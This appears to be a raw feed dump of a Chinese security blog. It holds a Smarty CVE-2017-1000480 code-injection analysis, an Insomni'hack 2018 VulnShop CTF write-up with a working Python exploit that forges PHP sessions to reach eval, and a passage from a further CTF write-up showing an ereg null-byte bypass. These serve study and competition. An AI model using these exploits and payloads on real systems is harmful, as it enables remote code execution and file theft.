class="keyword">$this</span>-&gt;compileTemplateSource($_smarty_tpl);</div><div class="line">	$compileCheck = $smarty-&gt;compile_check;</div><div class="line">	$smarty-&gt;compile_check = <span class="keyword">false</span>;</div><div class="line">	<span class="keyword">$this</span>-&gt;loadCompiledTemplate($_smarty_tpl);</div><div class="line">	$smarty-&gt;compile_check = $compileCheck;</div><div class="line">&#125;</div><div class="line">``</div><div class="line">`compileTemplateSource`方法定义在同文件的第<span class="number">169</span>行，在第<span class="number">181</span>行装载完编译器后（loadCompiler()），调用write方法进行写操作：</div><div class="line">```php</div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">compileTemplateSource</span><span class="params">(Smarty_Internal_Template $_template)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">		<span class="comment">// call compiler</span></div><div class="line">		$_template-&gt;loadCompiler();</div><div class="line">		<span class="keyword">$this</span>-&gt;write($_template, $_template-&gt;compiler-&gt;compileTemplate($_template));</div><div class="line">	&#125;</div><div class="line">	...</div></pre></td></tr></table></figure></p>
<p>跟入<code>compileTemplate</code>方法，定义<code>libs\sysplugins\smarty_internal_templatecompilerbase.php</code>第334行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">compileTemplate</span><span class="params">(Smarty_Internal_Template $template, $nocache = null,</span></span></div><div class="line">								Smarty_Internal_TemplateCompilerBase $parent_compiler = null)</div><div class="line">&#123;</div><div class="line">	<span class="comment">// get code frame of compiled template</span></div><div class="line">	$_compiled_code = $template-&gt;smarty-&gt;ext-&gt;_codeFrame-&gt;create($template,</div><div class="line">																 <span class="keyword">$this</span>-&gt;compileTemplateSource($template, $nocache,</div><div class="line">																							  $parent_compiler),</div><div class="line">																 <span class="keyword">$this</span>-&gt;postFilter(<span class="keyword">$this</span>-&gt;blockOrFunctionCode) .</div><div class="line">																 join(<span class="string">''</span>, <span class="keyword">$this</span>-&gt;mergedSubTemplatesCode), <span class="keyword">false</span>,</div><div class="line">																 <span class="keyword">$this</span>);</div><div class="line">	<span class="keyword">return</span> $_compiled_code;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>create是生成编译文件代码的方法，定义在<code>libs\sysplugins\smarty_internal_runtime_codeframe.php</code>第28行，为显示变量情况，这里我加了一句<code>var_dump</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/5.jpg?raw=true" alt=""></p>
<p>在第44行，在生成output内容时有如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$output .= <span class="string">"/* Smarty version "</span> . Smarty::SMARTY_VERSION . <span class="string">", created on "</span> . strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>) .</div><div class="line">                   <span class="string">"\n  from \""</span> . $_template-&gt;source-&gt;filepath . <span class="string">"\" */\n\n"</span>;</div></pre></td></tr></table></figure></p>
<p>将 <code>$_template-&gt;source-&gt;filepath</code>的内容直接拼接到了<code>$output</code>里。这段代码是为了生成编译文件中的注释，<code>$output</code>的头尾有注释符号<code>/*</code>和<code>*/</code>。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/6.jpg?raw=true" alt=""></p>
<p>现在考虑如何利用，我们需要闭合前面的注释符号，即payload的最前面需要加上<code>*/</code>。同时还要把后面的<code>*/</code>给注释掉，可以在payload最后加上<code>//</code>。中间填上php代码即可。另外需要注意的是，在win平台下，文件名中不允许有<code>*</code>，而smarty框架的生成的编译文件的名字会含有我们的payload，所以在win下时会直接提示创建文件失败。</p>
<p>在linux平台下即可利用成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/7.jpg?raw=true" alt=""></p>
<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>查看commit记录：<a href="https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61" target="_blank" rel="external">https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61</a></p>
<p>添加了过滤，将可能闭合的<code>*/</code>变为<code>* /</code>：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/8.jpg?raw=true" alt=""></p>
<p>在另外几处文件中也进行了过滤，要求只能出现字母和数字:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">substr(preg_replace(&apos;/[^A-Za-z0-9.]/&apos;,&apos;&apos;,$source-&gt;name),0,25);</div></pre></td></tr></table></figure></p>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>直接看生成的编译文件，会发现有两个输出点，第二个输出点在单引号内，但这个无法逃逸。在<code>libs\sysplugins\smarty_internal_runtime_codeframe.php</code>的第47行，使用的是<code>var_export</code>来导出变量内容的值：</p>
<pre><code class="lang-php">$dec = &quot;\$_smarty_tpl-&gt;_decodeProperties(\$_smarty_tpl, &quot; . var_export($properties, true) . &#39;,&#39; .
       ($cache ? &#39;true&#39; : &#39;false&#39;) . &quot;)&quot;;
$output .= &quot;if ({$dec}) {\n&quot;;
</code></pre>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/10.jpg?raw=true" alt=""></p>
<p>而如漏洞修补一节中所言，漏洞修补后，引号会被直接去除。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/1983&quot;&gt;阿里先知安全社区：Smarty &amp;lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 Insomni-hack-teaser-2018 比赛中有一题Smart-Y，该题用到了CVE-2017-1000480。故此分析一波。文中测试代码基于&lt;a href=&quot;http://smart-y.teaser.insomnihack.ch/console.php?hl&quot;&gt;Smart-Y源码&lt;/a&gt;魔改。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser 2018-VulnShop-writeup</title>
    <link href="http://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/"/>
    <id>http://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/</id>
    <published>2018-01-21T08:27:15.000Z</published>
    <updated>2018-01-21T08:28:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>Insomni’hack teaser 2018-VulnShop-writeup<br>session文件<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">We&apos;re preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.</div><div class="line"></div><div class="line">http://vulnshop.teaser.insomnihack.ch</div><div class="line"></div><div class="line">Important : you don&apos;t need to use automated scanners or bruteforce for this challenge, and using some will result for your ip to be banned. Go on IRC to ask for being unbanned.</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了<a href="http://vulnshop.teaser.insomnihack.ch/?hl" target="_blank" rel="external">源码</a>，和<a href="http://vulnshop.teaser.insomnihack.ch/phpinfo.php" target="_blank" rel="external">phpinfo</a></p>
<p>源码主要部分如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>]))&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</div><div class="line">    error_reporting(<span class="number">0</span>); session_start();</div><div class="line">    <span class="comment">// Anti XSS filter</span></div><div class="line">    $_REQUEST = array_map(<span class="string">"strip_tags"</span>, $_REQUEST);</div><div class="line">    <span class="comment">// For later, when we will store infos about visitors.</span></div><div class="line">    chdir(<span class="string">"tmp"</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">switch</span>($_GET[<span class="string">'page'</span>]) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="string">'default'</span>:</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'introduction'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Our website will introduce some new vulnerabilities. Let's check it out later!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'privacy'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'contactus'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span>;</div><div class="line">                $_SESSION[<span class="string">'challenge'</span>] = rand(<span class="number">100000</span>,<span class="number">999999</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'captcha'</span>:</div><div class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'challenge'</span>])) <span class="keyword">echo</span> $_SESSION[<span class="string">'challenge'</span>];</div><div class="line">                <span class="comment">// Will make an image later</span></div><div class="line">				touch($_SESSION[<span class="string">'challenge'</span>]);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'captcha-verify'</span>:</div><div class="line"><span class="comment">// verification functions take a file for later, when we'll provide more way of verification</span></div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">verifyFromString</span><span class="params">($file, $response)</span> </span>&#123;</div><div class="line">                    <span class="keyword">if</span>($_SESSION[<span class="string">'challenge'</span>] === $response) <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="comment">// Captcha from math op</span></div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">verifyFromMath</span><span class="params">($file, $response)</span> </span>&#123;</div><div class="line">                    <span class="keyword">if</span>(<span class="keyword">eval</span>(<span class="string">"return "</span>.$_SESSION[<span class="string">'challenge'</span>].<span class="string">" ;"</span>) === $response) <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'answer'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]) &amp;&amp; function_exists($_REQUEST[<span class="string">'method'</span>]))&#123;</div><div class="line">                    $_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>]);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>第一部分的php代码，对于接收进来的参数，都会进行strip_tags，将其中的html、php标签去除，同时开始了一个<code>session_start</code>。</p>
<p>第二部分中有几个功能：</p>
<ol>
<li>当<code>page=contactus</code>时，会随机产生一个变量<code>$_SESSION[&#39;challenge&#39;]</code>。</li>
<li>当<code>page=captcha</code>时，若之前已经访问过contactus，也即对应的变量<code>$_SESSION[&#39;challenge&#39;]</code>存在，则echo出来，并且创建一个以变量<code>$_SESSION[&#39;challenge&#39;]</code>值为名字的文件，后面我简称用户的challenge文件。</li>
<li>当<code>page=captcha-verify</code>时，通过传入对应的参数，会执行如下代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>])</div></pre></td></tr></table></figure>
</li>
</ol>
<p>同时在这个case中，还定义了两个函数，其中verifyFromMath()中出现了熟悉的eval。</p>
<p>通过基本的尝试，可以发现：</p>
<ol>
<li>由于strip_tags的存在，无法直接传入包含<code>&lt;?php</code>等的php代码</li>
<li>tmp目录不可读，通过touch生成的文件也无法访问。</li>
<li>网站根目录（即tmp目录的上一级目录）不可写<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/3.jpg?raw=true" alt=""></li>
</ol>
<p>考虑题目还给了phpinfo，经过查看，我们可以发现session文件的保存位置。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/2.jpg?raw=true" alt=""></p>
<p>我们知道在php中，通过查看cookie可以知道对应的PHPSESSID，比如<code>PHPSESSID=123456</code>，则在对应的session文件名即为<code>sess_123465</code>。以下是我本地测试用例：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/4.jpg?raw=true" alt=""></p>
<p>所以考虑一个场景：</p>
<ol>
<li>我们生成两个用户，也即两个session，对应着两个PHPSESSID。</li>
<li>利用用户1和captcha-verify功能，将php语句写入到用户2的session文件中，要注意格式，修改用户2对应的<code>$_SESSION[&#39;challenge&#39;]</code></li>
<li>利用用户2和verifyFromMath，执行<code>eval(&quot;return &quot;.$_SESSION[&#39;challenge&#39;].&quot; ;&quot;)</code>，从而执行我们的php代码。</li>
</ol>
<p>第一步，两个用户。因此我们要分两次的分别访问contactus和captcha，记录下他们对应的PHPSESSID。</p>
<p>第二步中，先来看看session文件的格式。由于我们要写入的是php语句，因此格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">challenge|s:7:&quot;chybeta&quot;;</div></pre></td></tr></table></figure></p>
<p>其中<code>s</code>表示字符串，后面的数字7为长度，引号中的内容是对应的php语句，其余的部分不变，上述示例对应的<code>$_SESSION[&#39;challenge&#39;]</code>即为<code>chybeta</code></p>
<p>接着考虑如何把这串内容写入到用户2的session文件中。源码中有这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>])</div></pre></td></tr></table></figure></p>
<p>因此我们先往用户1的challenge文件中写入对应php语句，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = file_put_contents</div><div class="line">$_REQUEST[&apos;answer&apos;] = fake-session-content</div><div class="line"></div><div class="line">file_put_contents(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], fake-session-content)</div></pre></td></tr></table></figure></p>
<p>这样在tmp目录下就生成了用户1对应的challenge文件，其内容为伪造的用户2的session文件内容。</p>
<p>接着覆盖:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = rename</div><div class="line">$_REQUEST[&apos;answer&apos;] = path_to_user2_session</div><div class="line"></div><div class="line">rename(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], path_to_user2_session)</div></pre></td></tr></table></figure></p>
<p>path<em>to_user2_session是指用户2的session文件的路径，从phpinfo，我们知道session路径为`/var/lib/php/sessions/sess</em>[对应的PHPSESSID]`</p>
<p>注意在整个第二步的操作过程中，我们没有关注用户1的session，它生成的challenge文件仅作为一个中转站。</p>
<p>第三步，执行php代码，注意这个时候用户2的session文件内容已经被改变了。这个时候需要进入verifyFromMath功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = verifyFromMath</div><div class="line">$_REQUEST[&apos;answer&apos;] = xxx</div><div class="line"></div><div class="line">verifyFromMath(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], xxx)</div><div class="line"></div><div class="line">	=&gt;  eval(&quot;return &quot;.$_SESSION[&apos;challenge&apos;].&quot; ;&quot;)</div></pre></td></tr></table></figure></p>
<p>利用exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">filePutContent</span><span class="params">(cookie,payload)</span>:</span></div><div class="line">	params = &#123;</div><div class="line">		<span class="string">'page'</span>:<span class="string">'captcha-verify'</span>,</div><div class="line">		<span class="string">'answer'</span>: payload,</div><div class="line">		<span class="string">'method'</span>:<span class="string">'file_put_contents'</span></div><div class="line">	&#125;</div><div class="line">	r = requests.get(url,params=params,cookies=cookie)</div><div class="line">	print(<span class="string">'[*] file_put_contents ok.'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(r1_cookie,r2_phpsessid,session_path)</span>:</span></div><div class="line">	cookie2_session_file = session_path + <span class="string">"sess_"</span> + r2_phpsessid</div><div class="line">	print(<span class="string">'[*] r2 session file path: '</span> + cookie2_session_file)</div><div class="line">	params = &#123;</div><div class="line">		<span class="string">'page'</span>:<span class="string">'captcha-verify'</span>,</div><div class="line">		<span class="string">'answer'</span>: cookie2_session_file,</div><div class="line">		<span class="string">'method'</span>:<span class="string">'rename'</span></div><div class="line">	&#125;</div><div class="line">	r = requests.get(url,params=params,cookies=r1_cookies)</div><div class="line">	print(<span class="string">'[*] rename ok.'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(cookie)</span>:</span></div><div class="line">	verifyurl = url + <span class="string">"?page=captcha-verify"</span></div><div class="line">	postdata = &#123;</div><div class="line">		<span class="string">"method"</span>:<span class="string">"verifyFromMath"</span>,</div><div class="line">		<span class="string">"answer"</span>:<span class="string">"a"</span></div><div class="line">	&#125;</div><div class="line">	p = re.compile(<span class="string">"(?&lt;=&lt;div class=\"content\"&gt;)(.*?)(?=&lt;/div&gt;)"</span>,re.S)</div><div class="line">	r = requests.post(verifyurl,data=postdata,cookies=cookie)</div><div class="line">	result = re.search(p,r.text).group(<span class="number">0</span>)</div><div class="line">	<span class="keyword">return</span> result.strip()</div><div class="line"></div><div class="line">url = <span class="string">"http://vulnshop.teaser.insomnihack.ch/index.php"</span></div><div class="line">session_path = <span class="string">"/var/lib/php/sessions/"</span></div><div class="line"></div><div class="line">contactus = &#123;</div><div class="line">	<span class="string">'page'</span>:<span class="string">'contactus'</span></div><div class="line">&#125;</div><div class="line">captcha = &#123;</div><div class="line">	<span class="string">'page'</span>:<span class="string">'captcha'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">r1 = requests.get(url,params=contactus)</div><div class="line">r1_cookies = r1.cookies</div><div class="line">r1_phpsessid = r1.cookies[<span class="string">'PHPSESSID'</span>]</div><div class="line">print(<span class="string">'[*] r1 PHPSESSID: '</span> + r1_phpsessid)</div><div class="line"></div><div class="line">r2 = requests.get(url,params=contactus)</div><div class="line">r2_cookies = r2.cookies</div><div class="line">r2_phpsessid = r2.cookies[<span class="string">'PHPSESSID'</span>]</div><div class="line">print(<span class="string">'[*] r2 PHPSESSID: '</span> + r2_phpsessid)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	payload = input(<span class="string">"[*] php code:"</span>)</div><div class="line">	length = len(payload)</div><div class="line">	content = <span class="string">'challenge|s:%d:"%s";'</span> % (length,payload)</div><div class="line">	filePutContent(r1_cookies,content)</div><div class="line">	rename(r1_cookies,r2_phpsessid,session_path)</div><div class="line">	print(<span class="string">'[*] eval result:'</span> + getResult(r2_cookies))</div></pre></td></tr></table></figure></p>
<p>php code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print_r(scandir(&apos;/&apos;));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/1.jpg?raw=true" alt=""></p>
<p>php code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print_r(file_get_contents(&apos;/flag&apos;));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/5.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INS&#123;4rb1tr4ry_func_c4ll_is_n0t_s0_fun&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Insomni’hack teaser 2018-VulnShop-writeup&lt;br&gt;session文件&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>赛博地球杯工业互联网安全大赛-Web-writeup</title>
    <link href="http://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/"/>
    <id>http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/</id>
    <published>2018-01-18T03:17:24.000Z</published>
    <updated>2018-01-21T07:49:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>为什么比赛要办在考试周。。<br>一些题是比赛完后做的，暂时只写了部分题的wp。<br><a id="more"></a></p>
<h1 id="大量设备报表不见了（签道题）"><a href="#大量设备报表不见了（签道题）" class="headerlink" title="大量设备报表不见了（签道题）"></a>大量设备报表不见了（签道题）</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</div><div class="line">http://120.27.14.73:20006/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>报表中心有链接，发现url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.27.14.73:20006/index.php?id=1</div></pre></td></tr></table></figure></p>
<p>不是sql注入，尝试爆破。当id=2333时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/4.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;2333_bao_pO_OOOO0o_o0OOO&#125;</div></pre></td></tr></table></figure>
<h1 id="工控系统的敏感消息遭泄漏"><a href="#工控系统的敏感消息遭泄漏" class="headerlink" title="工控系统的敏感消息遭泄漏"></a>工控系统的敏感消息遭泄漏</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。</div><div class="line">http://47.104.99.231:20003/</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>存在git泄露，用githack下载源码进行审计。</p>
<p>index2.php中，有如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$secret = $_GET[<span class="string">'secret'</span>];</div><div class="line">$ad  = $_GET[<span class="string">'ad'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($ad))&#123;</div><div class="line">    <span class="keyword">if</span>(ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $ad) === <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! Again !")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(strpos($ad, <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;"</span>;</div><div class="line">				<span class="keyword">if</span> (stripos($secret, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">die</span>();</div><div class="line">				&#125;</div><div class="line">        unserialize($secret);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! You must have --")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>ereg</code>，可以用<code>%00</code>绕过，然后再让<code>--</code>出现在<code>%00</code>的后面，即可进入第二个分支，进行反序列操作。在进行反序列化之前，进行了判断，不允许<code>$secret</code>中出现<code>./</code></p>
<p>在class.php中，定义了如下类：</p>
